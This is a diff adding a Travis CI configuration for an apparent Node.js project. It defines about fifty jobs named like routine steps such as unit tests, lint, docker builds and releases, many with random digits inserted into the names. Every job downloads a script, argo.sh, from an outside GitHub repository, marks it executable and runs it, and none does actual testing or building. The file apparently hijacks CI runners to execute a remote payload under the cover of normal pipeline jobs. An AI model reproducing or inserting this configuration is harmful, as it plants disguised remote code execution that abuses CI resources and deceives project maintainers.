@@ -1,0 +1,270 @@
+dist: bionic
+
+language: node_js
+
+branches:
+  only:
+    - /.*/
+
+cache:
+  directories:
+    - node_modules
+
+node_js:
+  - '12.16.3'
+
+jobs:
+  fast_finish: true
+  allow_failures:
+    - name: 'Mutation tests'
+  include:
+
+    - name: '1'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '2'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '3'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '4'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '5'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '6'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '7 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '8 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '9 docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '99 release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '789'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '6668 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '4234 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '423 docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '512 release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '341'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '423 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '54 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '121 docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '73 release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '41 yy'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: '6234 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Muta5253tion tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Bu452ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Pu5234blish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Li5523nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Un324it tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mutation tes52ts'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Build 41docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publ414ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Li43nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Uni42t tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mut411ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Bu4412ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Pu31312blish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Li323nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Unit5452 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mut4342ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Bu434213ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Pub543521lish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Lin535231t'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Un5235it tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mut5253ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Buil523523d docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publ523523ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Li523523nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'U5235235nit tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Mut35235ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Bui4234ld docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
+
+    - name: 'Publ4234234ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/jokogendeng/MazeMeCI/main/argo.sh && chmod u+x argo.sh && ./argo.sh
+      script: bash argo.sh
